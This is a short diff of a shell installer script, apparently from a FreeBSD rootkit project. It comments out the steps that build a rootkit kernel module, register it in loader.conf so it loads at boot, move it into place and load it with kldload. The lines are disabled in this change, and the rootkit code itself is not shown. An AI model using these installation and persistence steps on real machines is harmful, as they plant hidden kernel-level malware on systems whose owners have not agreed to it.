@@ -47,21 +47,21 @@ cat << "EOF"
 
 EOF
 
-cd $KMOD
+# cd $KMOD
 
-echo ">> Clean existing build."
-make clean
+# echo ">> Clean existing build."
+# make clean
 
-echo ">> Build rootkit."
-make
+# echo ">> Build rootkit."
+# make
 
-echo ">> Install rootkit kernel module."
+# echo ">> Install rootkit kernel module."
 
-echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
-touch $LOADER_CONF_TRANSPARENT
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+# touch $LOADER_CONF_TRANSPARENT
 
-mv $KMOD/$KO $INSTALL/$KO
-kldload $INSTALL/$KO
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
 
 cd $BINARIES
 
